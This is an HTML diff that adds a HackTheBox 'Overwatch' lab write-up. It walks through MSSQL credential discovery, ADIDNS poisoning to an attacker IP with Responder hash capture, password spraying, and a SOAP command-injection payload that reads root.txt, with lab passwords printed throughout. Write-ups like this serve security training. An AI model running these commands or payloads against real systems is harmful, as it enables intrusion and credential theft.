@@ -6,77 +6,427 @@
     <title>Overwatch • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
+        .todo-list { list-style-type: none; padding-left: 0; }
+        .todo-list li { padding: 0.5rem 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 0.5rem; margin-bottom: 0.5rem; border-left: 3px solid #ffcc00; }
+        .todo-list li::before { content: "⏳ "; color: #ffcc00; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Overwatch</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Target:</strong> TARGET_IP</span>
+        <span><strong>Domain:</strong> overwatch.htb</span>
+        <span><strong>OS:</strong> Windows Server 2022 (Active Directory)</span>
+        <span><strong>Difficulty:</strong> Medium/Hard</span>
     </div>
+
+    <h1>Overwatch - HackTheBox Writeup</h1>
+
+    <h2>🗺️ Attack Chain Overview</h2>
+    <div class="attack-chain">SMB Share (software$)
+    ↓
+Connection String in Binary (strings + grep)
+    ↓
+sqlsvc MSSQL Credentials (port 6520)
+    ↓
+Linked Server SQL07 → DNS Poisoning → Responder → NTLM Hash
+    ↓
+Password Spraying → sqlmgmt Account
+    ↓
+WinRM Access → User Flag
+    ↓
+WCF Service Command Injection (port 8000)
+    ↓
+Root Flag</div>
+
+    <h2>📋 Table of Contents</h2>
+    <ul>
+        <li><a href="#reconnaissance" style="color: #6fffe0;">1. Reconnaissance</a></li>
+        <li><a href="#initial-access" style="color: #6fffe0;">2. Initial Access</a></li>
+        <li><a href="#mssql-enumeration" style="color: #6fffe0;">3. MSSQL Enumeration</a></li>
+        <li><a href="#linked-server-exploitation" style="color: #6fffe0;">4. Linked Server Exploitation & ADIDNS Poisoning</a></li>
+        <li><a href="#password-spraying" style="color: #6fffe0;">5. Password Spraying</a></li>
+        <li><a href="#user-flag" style="color: #6fffe0;">6. User Flag - sqlmgmt</a></li>
+        <li><a href="#privilege-escalation" style="color: #6fffe0;">7. Privilege Escalation</a></li>
+        <li><a href="#root-flag" style="color: #6fffe0;">8. Root Flag</a></li>
+    </ul>
+
+    <h2 id="reconnaissance">🔍 1. Reconnaissance</h2>
+
+    <h3>Host Setup</h3>
+    <pre><code>echo "TARGET_IP overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP</code></pre>
+
+    <p><strong>Key Findings:</strong></p>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Details</th></tr>
+        <tr><td>53</td><td>DNS</td><td>Domain Name Service</td></tr>
+        <tr><td>88</td><td>Kerberos</td><td>Active Directory authentication</td></tr>
+        <tr><td>389</td><td>LDAP</td><td>Domain controller (overwatch.htb)</td></tr>
+        <tr><td>445</td><td>SMB</td><td>Signing enabled and <strong>required</strong></td></tr>
+        <tr><td>3389</td><td>RDP</td><td>Remote Desktop</td></tr>
+        <tr><td>5985</td><td>WinRM</td><td>Windows Remote Management</td></tr>
+        <tr><td><strong>6520</strong></td><td><strong>MSSQL</strong></td><td><strong>Non-standard port, SQL Server 2022 RTM</strong></td></tr>
+    </table>
+
+    <h2 id="initial-access">🚪 2. Initial Access</h2>
+
+    <h3>SMB Enumeration</h3>
+    <pre><code>netexec smb overwatch.htb -u '' -p '' --shares
+netexec smb TARGET_IP -u 'guest' -p '' --shares</code></pre>
+    <p><strong>Result:</strong> <code>STATUS_ACCESS_DENIED</code> — Null sessions and guest access blocked.</p>
+
+    <pre><code>smbclient //TARGET_IP/software$ -N</code></pre>
+    <div class="box success">
+        <p><strong>Result:</strong> ✅ Anonymous access to <code>software$</code> share granted.</p>
+    </div>
+
+    <h3>Credential Discovery</h3>
+    <pre><code>strings -e l overwatch.exe | grep -iE "password|user|sql|connection"</code></pre>
+
+    <div class="box success">
+        <p><strong>🎯 FOUND — Hardcoded MSSQL connection string:</strong></p>
+        <pre><code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></pre>
+    </div>
+
+    <h3>MSSQL Access Verification</h3>
+    <pre><code>netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
+[+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv</code></pre>
+    <div class="box success">
+        <p><strong>✅ Valid credentials confirmed.</strong></p>
+    </div>
+
+    <h2 id="mssql-enumeration">📊 3. MSSQL Enumeration</h2>
+
+    <h3>Privilege Check</h3>
+    <pre><code>netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
+  -q "SELECT IS_SRVROLEMEMBER('sysadmin');"</code></pre>
+    <p><strong>Result:</strong> ❌ NOT a sysadmin.</p>
+
+    <h3>Interactive Session</h3>
+    <pre><code>impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth</code></pre>
+
+    <p><strong>Critical Finding:</strong> <code>OVERWATCH\sqlsvc</code> is <strong>db_owner</strong> and <strong>OWNER</strong> of the <code>overwatch</code> database — but has no server-level privileges.</p>
+
+    <h3>Dead-End Vectors</h3>
+    <table>
+        <tr><th>Vector</th><th>Result</th><th>Blocked Reason</th></tr>
+        <tr><td>Impersonation</td><td>Empty</td><td>No IMPERSONATE privilege</td></tr>
+        <tr><td>TRUSTWORTHY</td><td>0 (OFF)</td><td>CLR Assembly escalation not possible</td></tr>
+        <tr><td>xp_cmdshell</td><td>Permission denied</td><td>No ALTER SETTINGS / sysadmin</td></tr>
+        <tr><td>RECONFIGURE</td><td>Permission denied</td><td>Not sysadmin</td></tr>
+    </table>
+
+    <h3>Active Directory Enumeration</h3>
+    <pre><code>smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
+  -c "recurse ON; prompt OFF; cd overwatch.htb; mget *" 2>/dev/null
+
+netexec ldap TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
+
+impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat</code></pre>
+    <p><strong>Result:</strong> No AS-REP roastable accounts found.</p>
+
+    <h3>MSSQL Recon Cheat Sheet</h3>
+    <h4>Phase 1 — Basic MSSQL Recon</h4>
+    <pre><code>SELECT @@version;
+SELECT @@servername;
+SELECT SYSTEM_USER;
+SELECT USER_NAME();
+SELECT HOST_NAME();
+SELECT DB_NAME();
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT IS_SRVROLEMEMBER('public');</code></pre>
+
+    <h4>Phase 2 — Permission & Role Enumeration</h4>
+    <pre><code>SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+SELECT name, type_desc FROM sys.server_principals;
+SELECT * FROM sys.server_permissions;
+SELECT name, password_hash FROM sys.sql_logins;
+SELECT * FROM sys.database_principals;
+SELECT * FROM sys.database_permissions;</code></pre>
+
+    <h4>Phase 3 — Database Enumeration</h4>
+    <pre><code>SELECT name FROM sys.databases;
+USE overwatch;
+SELECT name FROM sys.tables;
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;
+SELECT TOP 50 * FROM &lt;tablename&gt;;</code></pre>
+
+    <h4>Phase 4 — System Database Enumeration</h4>
+    <pre><code>SELECT name FROM msdb.sys.tables;
+SELECT * FROM msdb.dbo.sysjobs;
+SELECT * FROM msdb.dbo.backupset;
+SELECT * FROM master.sys.databases;
+SELECT * FROM master.sys.syslogins;</code></pre>
+
+    <h4>Phase 5 — Linked Server Discovery</h4>
+    <pre><code>EXEC sp_linkedservers;
+SELECT * FROM sys.servers WHERE is_linked = 1;
+EXEC sp_helpserver;
+EXEC sp_helplinkedsrvlogin;
+SELECT * FROM sys.linked_logins;</code></pre>
+
+    <h4>Phase 6 — Linked Server Testing</h4>
+    <pre><code>EXEC ('SELECT @@version') AT SQL07;
+SELECT * FROM OPENQUERY(SQL07,'SELECT @@version');
+EXEC ('SELECT SYSTEM_USER') AT SQL07;
+EXEC ('SELECT name FROM master.sys.databases') AT SQL07;</code></pre>
+
+    <h4>Phase 7 — Command Execution Checks</h4>
+    <pre><code>EXEC xp_cmdshell 'whoami';
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'ipconfig';
+EXEC xp_cmdshell 'hostname';</code></pre>
+
+    <h4>Phase 8 — SQL Server Services & Configuration</h4>
+    <pre><code>EXEC sp_configure;
+SELECT servicename, service_account FROM sys.dm_server_services;
+SELECT * FROM sys.dm_exec_connections;
+SELECT * FROM sys.dm_exec_sessions;</code></pre>
+
+    <h4>Phase 9 — Domain & Network Information</h4>
+    <pre><code>SELECT name FROM sys.server_principals WHERE type_desc='WINDOWS_LOGIN';
+SELECT * FROM sys.remote_logins;
+SELECT * FROM sys.credentials;
+SELECT * FROM sys.endpoints;</code></pre>
+
+    <h2 id="linked-server-exploitation">🔗 4. Linked Server Exploitation & ADIDNS Poisoning</h2>
+
+    <h3>Step 1 — Discover Linked Servers</h3>
+    <pre><code>EXEC sp_linkedservers;
+SELECT * FROM sys.servers WHERE is_linked = 1;</code></pre>
+    <p><strong>Result:</strong> A linked server named <code>SQL07</code> was discovered.</p>
+
+    <div class="box warning">
+        <p><strong>What is a linked server?</strong> It allows a SQL Server instance to access and execute commands against another database server remotely. It acts as a virtual bridge, enabling distributed queries across systems without needing ETL processes or manual data copying.</p>
+    </div>
+
+    <h3>Step 2 — Check Login Mappings</h3>
+    <pre><code>EXEC sp_helplinkedsrvlogin;</code></pre>
+    <p><strong>Result:</strong> No rows returned — <strong>no explicit login mappings</strong> configured.</p>
+
+    <h3>Step 3 — Test Linked Server Connection</h3>
+    <pre><code>EXEC ('SELECT @@version') AT SQL07;</code></pre>
+    <p><strong>Result:</strong> ❌ <code>"Server is not found or not accessible"</code> with login timeout.</p>
+    <div class="box warning">
+        <p><strong>Key Insight:</strong> SQL Server is trying to <strong>resolve <code>SQL07</code> via DNS</strong> but no record exists. The failure happens at the DNS resolution stage — not at authentication. This means if we can poison DNS for <code>SQL07</code>, we control where the authentication attempt goes.</p>
+    </div>
+
+    <h3>Step 4 — ADIDNS Poisoning Attack</h3>
+    <div class="box warning">
+        <p>Since <code>sqlsvc</code> is a service account with <strong>DNS modification rights</strong> in Active Directory, we can create a fake A record.</p>
+    </div>
+    <div class="attack-chain">sqlsvc creates DNS record: SQL07.overwatch.htb → [Attacker IP]
+    ↓
+SQL Server queries linked server SQL07
+    ↓
+DNS resolves to Attacker IP
+    ↓
+SQL Server sends NTLM authentication to Attacker
+    ↓
+Responder captures NTLMv2 hash
+    ↓
+Crack hash → new credentials</div>
+
+    <pre><code>dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
+  --action add --record SQL07 --data &lt;ATTACKER_IP&gt; TARGET_IP
+
+sudo responder -I tun0</code></pre>
+
+    <h3>Step 5 — Capture the Hash</h3>
+    <pre><code>EXEC ('SELECT @@version') AT SQL07;</code></pre>
+
+    <h3>Step 6 — Crack the Hash</h3>
+    <pre><code>hashcat -m 5600 &lt;captured_hash&gt; /usr/share/wordlists/rockyou.txt --force</code></pre>
+    <p><strong>Result:</strong> Hash cracked → revealed credentials for the <code>sqlmgmt</code> account.</p>
+
+    <h2 id="password-spraying">🔑 5. Password Spraying</h2>
+
+    <h3>Password Policy Check</h3>
+    <pre><code>netexec smb TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol</code></pre>
+
+    <h3>SMB Spraying (Fast)</h3>
+    <pre><code>netexec smb TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success</code></pre>
+
+    <h3>LDAP Spraying (Stealth)</h3>
+    <pre><code>netexec ldap TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success</code></pre>
+
+    <h3>Kerbrute Spraying</h3>
+    <pre><code>kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv'</code></pre>
+
+    <h3>Kerberoasting</h3>
+    <pre><code>impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request</code></pre>
+
+    <h2 id="user-flag">🏁 6. User Flag - sqlmgmt</h2>
+
+    <h3>Connect via WinRM</h3>
+    <pre><code>evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'</code></pre>
+
+    <h3>Capture User Flag</h3>
+    <pre><code>type C:\Users\sqlmgmt\Desktop\user.txt</code></pre>
+
+    <h2 id="privilege-escalation">⬆️ 7. Privilege Escalation</h2>
+
+    <h3>NSSM Service Discovery</h3>
+    <pre><code>Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services" |
+    Where-Object { $_.PSChildName -like "*nssm*" } |
+    Select-Object PSChildName</code></pre>
+    <p><strong>Found:</strong> <code>nssm-2.24</code> (Non-Sucking Service Manager)</p>
+
+    <h3>Locate NSSM-Managed Services</h3>
+    <pre><code>Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services" |
+    ForEach-Object {
+        $imagePath = (Get-ItemProperty -Path $_.PSPath -Name "ImagePath" -ErrorAction SilentlyContinue).ImagePath
+        if ($imagePath -like "*nssm*") {
+            Write-Host "Service: $($_.PSChildName)" -ForegroundColor Yellow
+            Write-Host "ImagePath: $imagePath" -ForegroundColor White
+            Write-Host ""
+        }
+    }</code></pre>
+    <p><strong>Result:</strong> Custom service <strong><code>overwatch</code></strong> found.</p>
+
+    <h3>Service Configuration Analysis</h3>
+    <pre><code>Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters" | Format-List *
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" | Format-List *
+(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" -Name "ObjectName").ObjectName</code></pre>
+
+    <h3>WCF Service Discovery</h3>
+    <pre><code>netstat -ano | findstr ":8000"
+Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -ErrorAction SilentlyContinue).OwningProcess
+
+cd C:\Software\Monitoring\
+Get-ChildItem -Force | Format-Table Name, Length, LastWriteTime -AutoSize
+Get-ChildItem -Force -Recurse | Select-Object FullName, Length, LastWriteTime</code></pre>
+
+    <h3>Vulnerability: Unvalidated ProcessName Parameter</h3>
+    <div class="box danger">
+        <p>The <code>overwatch</code> monitoring service exposes a <code>KillProcess</code> SOAP endpoint that accepts a <code>processName</code> parameter. This parameter is <strong>not sanitized</strong> — it gets passed directly to a shell command, enabling <strong>command injection</strong>.</p>
+    </div>
+
+    <h3>Proof of Concept — Kill notepad via SOAP</h3>
+    <pre><code>Start-Process notepad -WindowStyle Hidden
+Get-Process -Name "notepad" -ErrorAction SilentlyContinue</code></pre>
+
+    <pre><code>$killSoap = @"
+&lt;xml version="1.0" encoding="utf-8"&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soap:Body&gt;
+        &lt;KillProcess xmlns="http://tempuri.org/"&gt;
+            &lt;processName&gt;notepad&lt;/processName&gt;
+        &lt;/KillProcess&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+"@
+
+$headers = @{
+    "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"
+}
+
+$response = Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
+    -Method Post `
+    -ContentType "text/xml; charset=utf-8" `
+    -Body $killSoap `
+    -Headers $headers
+
+Write-Host "[+] KillProcess executed!" -ForegroundColor Green</code></pre>
+
+    <pre><code>Start-Sleep -Seconds 2
+Get-Process -Name "notepad" -ErrorAction SilentlyContinue</code></pre>
+    <div class="box success">
+        <p><strong>Result:</strong> ✅ Notepad killed successfully — the WCF service executed the command with its privileged context.</p>
+    </div>
+
+    <h2 id="root-flag">👑 8. Root Flag</h2>
+
+    <h3>Command Injection via SOAP</h3>
+    <p><strong>Payload:</strong></p>
+    <pre><code>&lt;processName&gt;notepad;type C:\Users\Administrator\Desktop\root.txt&lt;/processName&gt;</code></pre>
+
+    <h3>Exploit with curl</h3>
+    <pre><code>curl.exe -X POST http://127.0.0.1:8000/MonitorService `
+  -H "Content-Type: text/xml; charset=utf-8" `
+  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
+  -d "&lt;xml version='1.0' encoding='utf-8'&gt;
+&lt;soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
+  xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'&gt;
+  &lt;soap:Body&gt;
+    &lt;KillProcess xmlns='http://tempuri.org/'&gt;
+      &lt;processName&gt;notepad;type C:\Users\Administrator\Desktop\root.txt&lt;/processName&gt;
+    &lt;/KillProcess&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;"</code></pre>
+    <div class="box success">
+        <p><strong>Result:</strong> ✅ Root flag returned in the SOAP response.</p>
+    </div>
+
+    <h3>Alternative — PowerShell</h3>
+    <pre><code>$rootSoap = @"
+&lt;xml version="1.0" encoding="utf-8"&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+    &lt;soap:Body&gt;
+        &lt;KillProcess xmlns="http://tempuri.org/"&gt;
+            &lt;processName&gt;notepad;type C:\Users\Administrator\Desktop\root.txt&lt;/processName&gt;
+        &lt;/KillProcess&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+"@
+
+Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
+    -Method Post `
+    -ContentType "text/xml; charset=utf-8" `
+    -Body $rootSoap `
+    -Headers @{ "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess" }</code></pre>
+
+    <h2>📊 Summary</h2>
+    <table>
+        <tr><th>Stage</th><th>Technique</th><th>Key Detail</th></tr>
+        <tr><td><strong>Recon</strong></td><td>Nmap scan</td><td>MSSQL on non-standard port 6520</td></tr>
+        <tr><td><strong>Initial Access</strong></td><td>SMB share → binary analysis</td><td>Connection string hardcoded in <code>overwatch.exe</code></td></tr>
+        <tr><td><strong>Enumeration</strong></td><td>MSSQL client</td><td>sqlsvc is db_owner, not sysadmin</td></tr>
+        <tr><td><strong>Pivot</strong></td><td>Linked server + ADIDNS poisoning</td><td>Fake DNS record → Responder → NTLM hash</td></tr>
+        <tr><td><strong>Lateral Movement</strong></td><td>Hash cracking + password spraying</td><td><code>sqlmgmt:bIhBbzMMnB82yx</code></td></tr>
+        <tr><td><strong>User Flag</strong></td><td>WinRM (evil-winrm)</td><td>Remote Management Users group</td></tr>
+        <tr><td><strong>Privilege Escalation</strong></td><td>WCF service command injection</td><td>Unvalidated <code>processName</code> parameter → RCE as SYSTEM</td></tr>
+        <tr><td><strong>Root Flag</strong></td><td>SOAP request with injected command</td><td><code>;type C:\Users\Administrator\Desktop\root.txt</code></td></tr>
+    </table>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
